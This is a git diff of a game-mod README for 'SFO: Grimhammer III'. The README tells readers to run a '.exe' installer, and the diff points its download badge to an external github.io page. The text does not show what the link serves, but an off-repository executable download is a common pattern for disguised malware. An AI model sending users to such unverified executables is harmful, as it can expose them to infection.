@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install SFO: Grimhammer III automatically into your Total War: WARHAMMER III directory.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://sfo-grimhammer-iii-warhammer3.github.io/.github/)
 
 ## 📸 Overview
 ![sfo3-battles](https://github.com/user-attachments/assets/a2ddd750-f640-4c94-b599-f6308ad6cf37)
